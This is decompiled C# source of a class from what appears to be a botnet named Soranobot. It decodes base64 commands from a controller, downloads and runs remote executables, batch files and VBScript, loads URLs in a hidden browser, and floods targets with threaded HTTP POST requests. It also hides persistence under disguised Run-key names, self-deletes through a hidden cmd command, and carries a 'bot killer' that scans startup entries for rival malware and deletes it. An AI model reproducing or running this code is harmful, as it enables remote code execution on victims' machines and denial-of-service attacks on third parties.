using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace Soranobot.Classes
{
	// Token: 0x0200000E RID: 14
	internal class Misc
	{
		// Token: 0x06000033 RID: 51 RVA: 0x00003054 File Offset: 0x00001254
		public static string hash(string input)
		{
			byte[] array = new MD5CryptoServiceProvider().ComputeHash(Encoding.UTF8.GetBytes(input));
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < array.Length; i++)
			{
				stringBuilder.Append(array[i].ToString("x2"));
			}
			return stringBuilder.ToString().ToUpper();
		}

		// Token: 0x06000034 RID: 52 RVA: 0x000030B0 File Offset: 0x000012B0
		public static string getLocation()
		{
			string location = Assembly.GetExecutingAssembly().Location;
			if (location == "" || location == null)
			{
				location = Assembly.GetEntryAssembly().Location;
			}
			return location;
		}

		// Token: 0x06000035 RID: 53 RVA: 0x000021B8 File Offset: 0x000003B8
		public static bool isAdmin()
		{
			return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
		}

		// Token: 0x06000036 RID: 54 RVA: 0x000030E4 File Offset: 0x000012E4
		public static string lastReboot()
		{
			double num = (double)(new Computer().Clock.TickCount / 1000 / 60);
			string result;
			if (num > 60.0)
			{
				num /= 60.0;
				if (num > 24.0)
				{
					num /= 24.0;
					result = ((int)num).ToString() + " day(s) ago";
				}
				else
				{
					result = ((int)num).ToString() + " hour(s) ago";
				}
			}
			else
			{
				result = ((int)num).ToString() + " minute(s) ago";
			}
			return result;
		}

		// Token: 0x06000037 RID: 55 RVA: 0x00003184 File Offset: 0x00001384
		public static string randomString(int length)
		{
			char[] array = "abcdefghijklmnopqrstuvwxyz".ToCharArray();
			VBMath.Randomize();
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 1; i < length; i++)
			{
				int num = (int)((float)(array.Length - 2 + 1) * VBMath.Rnd()) + 1;
				stringBuilder.Append(array[num]);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x06000038 RID: 56 RVA: 0x000031D8 File Offset: 0x000013D8
		public static bool keyExists(string key)
		{
			bool result = false;
			string[] valueNames = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", false).GetValueNames();
			for (int i = 0; i < valueNames.Length; i++)
			{
				if (valueNames[i] == key)
				{
					result = true;
				}
			}
			return result;
		}

		// Token: 0x06000039 RID: 57 RVA: 0x0000321C File Offset: 0x0000141C
		public static bool processTask(string task, string param)
		{
			string @string = Encoding.UTF8.GetString(Convert.FromBase64String(task));
			string string2 = Encoding.UTF8.GetString(Convert.FromBase64String(Encoding.UTF8.GetString(Convert.FromBase64String(param))));
			uint num = <PrivateImplementationDetails>.ComputeStringHash(@string);
			if (num <= 856466825U)
			{
				if (num <= 806133968U)
				{
					if (num != 468396612U)
					{
						if (num == 806133968U)
						{
							if (@string == "5")
							{
								return Misc.visit(string2, true);
							}
						}
					}
					else if (@string == "10")
					{
						return Misc.uninstall();
					}
				}
				else if (num != 822911587U)
				{
					if (num != 839689206U)
					{
						if (num == 856466825U)
						{
							if (@string == "6")
							{
								return Misc.dlexxxx(string2);
							}
						}
					}
					else if (@string == "7")
					{
						return Misc.dlexx(string2, "", false);
					}
				}
				else if (@string == "4")
				{
					return Misc.visit(string2, false);
				}
			}
			else if (num <= 906799682U)
			{
				if (num != 873244444U)
				{
					if (num == 906799682U)
					{
						if (@string == "3")
						{
							return Misc.dlex(string2, string2.Split(new char[]
							{
								'~'
							})[1], false);
						}
					}
				}
				else if (@string == "1")
				{
					return Misc.dlex(string2, "", false);
				}
			}
			else if (num != 923577301U)
			{
				if (num != 1007465396U)
				{
					if (num == 1024243015U)
					{
						if (@string == "8")
						{
							return Misc.dlexxx(string2, "", false);
						}
					}
				}
				else if (@string == "9")
				{
					return Misc.update(string2);
				}
			}
			else if (@string == "2")
			{
				return Misc.dlex(string2, "", true);
			}
			return false;
		}

		// Token: 0x0600003A RID: 58 RVA: 0x0000346C File Offset: 0x0000166C
		private static bool dlex(string url, string cmdline = "", bool inject = false)
		{
			bool result;
			try
			{
				WebClient webClient = new WebClient();
				webClient.Proxy = null;
				if (!inject)
				{
					string fileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Misc.randomString(7) + ".exe";
					webClient.DownloadFile(url, fileName);
					Process.Start(new ProcessStartInfo
					{
						FileName = fileName,
						Arguments = cmdline
					});
					result = true;
				}
				else
				{
					webClient.DownloadData(url);
					VBMath.Randomize();
					string text = Misc.surrogates[Misc.r.Next(0, Misc.surrogates.Length - 1)];
					result = true;
				}
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600003B RID: 59 RVA: 0x00003510 File Offset: 0x00001710
		private static bool dlexx(string url, string cmdline = "", bool inject = false)
		{
			bool result;
			try
			{
				WebClient webClient = new WebClient();
				webClient.Proxy = null;
				if (!inject)
				{
					string fileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Misc.randomString(7) + ".bat";
					webClient.DownloadFile(url, fileName);
					Process.Start(new ProcessStartInfo
					{
						FileName = fileName,
						Arguments = cmdline
					});
					result = true;
				}
				else
				{
					webClient.DownloadData(url);
					VBMath.Randomize();
					string text = Misc.surrogates[Misc.r.Next(0, Misc.surrogates.Length - 1)];
					result = true;
				}
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600003C RID: 60 RVA: 0x000035B4 File Offset: 0x000017B4
		private static bool dlexxx(string url, string cmdline = "", bool inject = false)
		{
			bool result;
			try
			{
				WebClient webClient = new WebClient();
				webClient.Proxy = null;
				if (!inject)
				{
					string fileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Misc.randomString(7) + ".vbs";
					webClient.DownloadFile(url, fileName);
					Process.Start(new ProcessStartInfo
					{
						FileName = fileName,
						Arguments = cmdline
					});
					result = true;
				}
				else
				{
					webClient.DownloadData(url);
					VBMath.Randomize();
					string text = Misc.surrogates[Misc.r.Next(0, Misc.surrogates.Length - 1)];
					result = true;
				}
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600003D RID: 61 RVA: 0x00003658 File Offset: 0x00001858
		private static bool dlexxxx(string url)
		{
			int num = 20;
			Random r = new Random();
			ThreadStart <>9__0;
			for (int i = 0; i < num; i++)
			{
				ThreadStart start;
				if ((start = <>9__0) == null)
				{
					start = (<>9__0 = delegate()
					{
						Thread.CurrentThread.IsBackground = true;
						Thread.CurrentThread.Priority = ThreadPriority.Highest;
						for (;;)
						{
							try
							{
								TcpClient tcpClient = new TcpClient();
								tcpClient.NoDelay = true;
								tcpClient.Connect(url, 80);
								StreamWriter streamWriter = new StreamWriter(tcpClient.GetStream());
								streamWriter.Write(string.Concat(new object[]
								{
									"POST / HTTP/1.1\r\nHost: ",
									url,
									"\r\nContent-length: ",
									r.Next(3500, 10000),
									"\r\n\r\n"
								}));
								streamWriter.Flush();
							}
							catch
							{
							}
						}
					});
				}
				new Thread(start).Start();
			}
			goto IL_50;
			for (;;)
			{
				IL_50:
				goto IL_50;
			}
		}

		// Token: 0x0600003E RID: 62 RVA: 0x000036B8 File Offset: 0x000018B8
		private static bool update(string url)
		{
			bool result;
			try
			{
				Misc.dlex(url, "", false);
				Program.s.Abort();
				if (Misc.keyExists("Catalyst Control Center"))
				{
					Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue("Catalyst Control Center");
				}
				Process.Start(new ProcessStartInfo
				{
					FileName = "cmd.exe",
					Arguments = "/C ping 1.1.1.1 -n 1 -w 4000 > Nul & Del \"" + Misc.getLocation() + "\"",
					CreateNoWindow = true,
					WindowStyle = ProcessWindowStyle.Hidden
				});
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600003F RID: 63 RVA: 0x0000375C File Offset: 0x0000195C
		private static bool visit(string url, bool hide = false)
		{
			bool result;
			try
			{
				if (!hide)
				{
					Process.Start(url);
					result = true;
				}
				else
				{
					Thread thread = new Thread(new ParameterizedThreadStart(Misc.viewhidden));
					thread.SetApartmentState(ApartmentState.STA);
					thread.Start(url);
					result = true;
				}
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000040 RID: 64 RVA: 0x000037B0 File Offset: 0x000019B0
		private static void viewhidden(object url)
		{
			try
			{
				new WebBrowser
				{
					ScriptErrorsSuppressed = true
				}.Navigate((string)url);
				Application.Run();
			}
			catch
			{
			}
		}

		// Token: 0x06000041 RID: 65 RVA: 0x000021D3 File Offset: 0x000003D3
		private static bool bkill()
		{
			Misc.Removal.ScanThread();
			return true;
		}

		// Token: 0x06000042 RID: 66 RVA: 0x000021DB File Offset: 0x000003DB
		private static void bkillp()
		{
			goto IL_00;
			for (;;)
			{
				IL_00:
				goto IL_00;
			}
		}

		// Token: 0x06000043 RID: 67 RVA: 0x000037F0 File Offset: 0x000019F0
		private static bool uninstall()
		{
			bool result;
			try
			{
				Program.s.Abort();
				if (Misc.keyExists("SteamCommunity"))
				{
					Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue("SteamCommunity");
				}
				Process.Start(new ProcessStartInfo
				{
					FileName = "cmd.exe",
					Arguments = "/C ping 1.1.1.1 -n 1 -w 4000 > Nul & Del \"" + Misc.getLocation() + "\"",
					CreateNoWindow = true,
					WindowStyle = ProcessWindowStyle.Hidden
				});
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x04000020 RID: 32
		public static Thread bkillThread;

		// Token: 0x04000021 RID: 33
		public static string[] surrogates = new string[]
		{
			Environment.GetEnvironmentVariable("windir") + "\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe",
			Environment.GetEnvironmentVariable("windir") + "\\Microsoft.NET\\Framework\\v2.0.50727\\csc.exe"
		};

		// Token: 0x04000022 RID: 34
		private static Random r = new Random();

		// Token: 0x0200000F RID: 15
		public class Removal
		{
			// Token: 0x06000046 RID: 70 RVA: 0x00002050 File Offset: 0x00000250
			public static void ScanThread()
			{
			}

			// Token: 0x06000047 RID: 71 RVA: 0x000021DE File Offset: 0x000003DE
			private static string Get(string Link)
			{
				WebRequest webRequest = WebRequest.Create(Link);
				webRequest.Credentials = CredentialCache.DefaultCredentials;
				((HttpWebRequest)webRequest).UserAgent = "1M50RRY";
				return new StreamReader(webRequest.GetResponse().GetResponseStream()).ReadToEnd();
			}

			// Token: 0x06000048 RID: 72 RVA: 0x000038D8 File Offset: 0x00001AD8
			public static void scan()
			{
				try
				{
					Misc.Removal.lobj.Clear();
					List<string> list = new List<string>();
					foreach (string item in Misc.Removal.returnHKCU("Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
					{
						list.Add(item);
					}
					foreach (string item2 in Misc.Removal.returnHKCU("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
					{
						list.Add(item2);
					}
					foreach (string item3 in Misc.Removal.returnHKLM("Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
					{
						list.Add(item3);
					}
					foreach (string item4 in Misc.Removal.returnHKLM("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
					{
						list.Add(item4);
					}
					foreach (string item5 in Misc.Removal.returnDirs(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
					{
						list.Add(item5);
					}
					foreach (string text in list)
					{
						try
						{
							if (Misc.Removal.usepath(text.Split(new char[]
							{
								Misc.Removal.split1
							})[0]))
							{
								Misc.Removal.lobj.Add(Misc.Removal.scanFile(text));
							}
						}
						catch
						{
						}
					}
					for (int num = 0; num == Misc.Removal.lobj.Count - 1; num++)
					{
						Misc.Removal.removeThreat(num);
					}
				}
				catch
				{
				}
			}

			// Token: 0x06000049 RID: 73 RVA: 0x00003B68 File Offset: 0x00001D68
			public static Misc.Removal.PossibleThreat scanFile(string path)
			{
				Misc.Removal.PossibleThreat possibleThreat2;
				try
				{
					if (File.Exists(path.Split(new char[]
					{
						Misc.Removal.split1
					})[0]))
					{
						Misc.Removal.PossibleThreat possibleThreat = default(Misc.Removal.PossibleThreat);
						possibleThreat.fullpath = path.Split(new char[]
						{
							Misc.Removal.split1
						})[0];
						possibleThreat.regkey = path.Split(new char[]
						{
							Misc.Removal.split1
						})[1];
						possibleThreat.running = Misc.Removal.isRunning(path);
						possibleThreat.exename = Path.GetFileName(possibleThreat.fullpath);
						possibleThreat.btype = Misc.Removal.JudgedAs.Unknown;
						if (possibleThreat.fullpath == Misc.getLocation())
						{
							possibleThreat2 = default(Misc.Removal.PossibleThreat);
							possibleThreat2 = possibleThreat2;
						}
						else
						{
							string text = Encoding.UTF8.GetString(File.ReadAllBytes(possibleThreat.fullpath)).Trim(new char[1]);
							if (text != null)
							{
								foreach (string value in Misc.Removal.generic)
								{
									if (text.Contains(value))
									{
										possibleThreat.btype = Misc.Removal.JudgedAs.GenericBot;
									}
								}
								foreach (string value2 in Misc.Removal.keylogger)
								{
									if (text.Contains(value2))
									{
										possibleThreat.btype = Misc.Removal.JudgedAs.Keylogger;
									}
								}
								foreach (string value3 in Misc.Removal.injector)
								{
									if (text.Contains(value3))
									{
										possibleThreat.btype = Misc.Removal.JudgedAs.Injector;
									}
								}
								foreach (string value4 in Misc.Removal.ircbot)
								{
									if (text.Contains(value4))
									{
										possibleThreat.btype = Misc.Removal.JudgedAs.IRC_Bot;
									}
								}
								possibleThreat2 = possibleThreat;
							}
							else
							{
								possibleThreat2 = default(Misc.Removal.PossibleThreat);
							}
						}
					}
					else
					{
						possibleThreat2 = default(Misc.Removal.PossibleThreat);
					}
				}
				catch
				{
					possibleThreat2 = default(Misc.Removal.PossibleThreat);
				}
				return possibleThreat2;
			}

			// Token: 0x0600004A RID: 74 RVA: 0x00003D54 File Offset: 0x00001F54
			private static void removeThreat(int lid)
			{
				try
				{
					foreach (Process process in Process.GetProcesses())
					{
						try
						{
							if (process.MainModule.FileName == Misc.Removal.lobj[lid].fullpath)
							{
								process.Kill();
								Thread.Sleep(1000);
							}
						}
						catch
						{
						}
					}
					File.Delete(Misc.Removal.lobj[lid].fullpath);
					Thread.Sleep(1000);
					if (Misc.Removal.lobj[lid].regkey != "" || Misc.Removal.lobj[lid].regkey != null)
					{
						string a = Misc.Removal.lobj[lid].regkey.Split(new char[]
						{
							'\\'
						})[0];
						if (!(a == "HKEY_CURRENT_USER"))
						{
							if (a == "HKEY_LOCAL_MACHINE")
							{
								string text = Misc.Removal.lobj[lid].regkey.Remove(0, Misc.Removal.lobj[lid].regkey.IndexOf("\\", StringComparison.Ordinal) + 1);
								string name = text.Substring(0, text.LastIndexOf('\\'));
								string name2 = text.Remove(0, text.LastIndexOf('\\') + 1);
								Registry.LocalMachine.OpenSubKey(name, true).DeleteValue(name2);
							}
						}
						else
						{
							string text2 = Misc.Removal.lobj[lid].regkey.Remove(0, Misc.Removal.lobj[lid].regkey.IndexOf("\\", StringComparison.Ordinal) + 1);
							string name3 = text2.Substring(0, text2.LastIndexOf('\\'));
							string name4 = text2.Remove(0, text2.LastIndexOf('\\') + 1);
							Registry.CurrentUser.OpenSubKey(name3, true).DeleteValue(name4);
						}
					}
					Thread.Sleep(1000);
				}
				catch
				{
				}
			}

			// Token: 0x0600004B RID: 75 RVA: 0x00002215 File Offset: 0x00000415
			private static bool usepath(string path)
			{
				return path.Contains(Misc.Removal.users);
			}

			// Token: 0x0600004C RID: 76 RVA: 0x00003F6C File Offset: 0x0000216C
			private static List<string> returnHKCU(string key)
			{
				List<string> list = new List<string>();
				foreach (string text in Registry.CurrentUser.OpenSubKey(key, false).GetValueNames())
				{
					string text2 = (string)Registry.CurrentUser.OpenSubKey(key, false).GetValue(text);
					if (text2.Contains("\""))
					{
						text2 = text2.Split(new char[]
						{
							'"'
						})[1];
					}
					if (text2.Contains("-"))
					{
						text2 = text2.Split(new char[]
						{
							'-'
						})[0];
					}
					if (text2.Contains("/"))
					{
						text2 = text2.Split(new char[]
						{
							'/'
						})[0];
					}
					if (text2.Contains(".exe") || text2.Contains(".dll") || text2.Contains(".bat") || text2.Contains(".vbs") || text2.Contains(".scr"))
					{
						list.Add(string.Concat(new string[]
						{
							text2,
							Misc.Removal.split1.ToString(),
							"HKEY_CURRENT_USER\\",
							key,
							"\\",
							text
						}));
					}
				}
				return list;
			}

			// Token: 0x0600004D RID: 77 RVA: 0x000040B0 File Offset: 0x000022B0
			private static List<string> returnHKLM(string key)
			{
				List<string> list = new List<string>();
				foreach (string text in Registry.LocalMachine.OpenSubKey(key, false).GetValueNames())
				{
					string text2 = (string)Registry.LocalMachine.OpenSubKey(key, false).GetValue(text);
					if (text2.Contains("\""))
					{
						text2 = text2.Split(new char[]
						{
							'"'
						})[1];
					}
					if (text2.Contains("-"))
					{
						text2 = text2.Split(new char[]
						{
							'-'
						})[0];
					}
					if (text2.Contains("/"))
					{
						text2 = text2.Split(new char[]
						{
							'/'
						})[0];
					}
					if (text2.Contains(".exe") || text2.Contains(".dll") || text2.Contains(".bat") || text2.Contains(".vbs") || text2.Contains(".scr"))
					{
						list.Add(string.Concat(new string[]
						{
							text2,
							Misc.Removal.split1.ToString(),
							"HKEY_LOCAL_MACHINE\\",
							key,
							"\\",
							text
						}));
					}
				}
				return list;
			}

			// Token: 0x0600004E RID: 78 RVA: 0x000041F4 File Offset: 0x000023F4
			private static List<string> returnDirs(string path)
			{
				List<string> list = new List<string>();
				foreach (FileInfo fileInfo in new DirectoryInfo(path).GetFiles())
				{
					if (fileInfo.FullName.Contains(".exe") || fileInfo.FullName.Contains(".dll") || fileInfo.FullName.Contains(".bat") || fileInfo.FullName.Contains(".vbs") || fileInfo.FullName.Contains(".scr"))
					{
						list.Add(fileInfo.FullName + Misc.Removal.split1.ToString() + fileInfo.FullName);
					}
				}
				return list;
			}

			// Token: 0x0600004F RID: 79 RVA: 0x000042A8 File Offset: 0x000024A8
			private static bool isRunning(string fullpath)
			{
				bool result = false;
				try
				{
					Process[] processes = Process.GetProcesses();
					int num = 0;
					if (num < processes.Length && processes[num].MainModule.FileName == fullpath)
					{
						result = true;
					}
				}
				catch
				{
				}
				return result;
			}

			// Token: 0x04000023 RID: 35
			public static string applocal = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

			// Token: 0x04000024 RID: 36
			public static string temp = Environment.GetEnvironmentVariable("temp");

			// Token: 0x04000025 RID: 37
			public static string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

			// Token: 0x04000026 RID: 38
			public static string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

			// Token: 0x04000027 RID: 39
			public static string users = Environment.GetEnvironmentVariable("userprofile");

			// Token: 0x04000028 RID: 40
			public static char split1 = '\u0005';

			// Token: 0x04000029 RID: 41
			public static char split2 = '\u0006';

			// Token: 0x0400002A RID: 42
			private static string[] keylogger = new string[]
			{
				"SetWindowsHookEx",
				"GetForegroundWindow",
				"GetWindowText",
				"GetAsyncKeyState"
			};

			// Token: 0x0400002B RID: 43
			private static string[] injector = new string[]
			{
				"SetThreadContext",
				"ZwUnmapViewOfSection",
				"VirtualAllocEx",
				"GetExecutingAssembly",
				"System.Reflection"
			};

			// Token: 0x0400002C RID: 44
			private static string[] ircbot = new string[]
			{
				"PRIVMSG",
				"JOIN",
				"USER",
				"NICK"
			};

			// Token: 0x0400002D RID: 45
			private static string[] generic = new string[]
			{
				"WSAStartup",
				"gethostbyname",
				"gethostbyaddr",
				"gethostname",
				"bs_fusion_bot",
				"MAP_GETCOUNTRY",
				"VS_VERSION_INFO",
				"LookupAccountNameA",
				"CryptUnprotectData",
				"Blackshades NET"
			};

			// Token: 0x0400002E RID: 46
			private static string[] crypter = new string[]
			{
				"MD5CryptoServiceProvider",
				"RijndaelManaged"
			};

			// Token: 0x0400002F RID: 47
			private static List<Misc.Removal.PossibleThreat> lobj = new List<Misc.Removal.PossibleThreat>();

			// Token: 0x02000010 RID: 16
			public struct PossibleThreat
			{
				// Token: 0x04000030 RID: 48
				public string fullpath;

				// Token: 0x04000031 RID: 49
				public bool running;

				// Token: 0x04000032 RID: 50
				public Misc.Removal.JudgedAs btype;

				// Token: 0x04000033 RID: 51
				public string regkey;

				// Token: 0x04000034 RID: 52
				public string exename;
			}

			// Token: 0x02000011 RID: 17
			public enum JudgedAs
			{
				// Token: 0x04000036 RID: 54
				Unknown = 17,
				// Token: 0x04000037 RID: 55
				Keylogger,
				// Token: 0x04000038 RID: 56
				GenericBot,
				// Token: 0x04000039 RID: 57
				Injector,
				// Token: 0x0400003A RID: 58
				IRC_Bot
			}
		}
	}
}
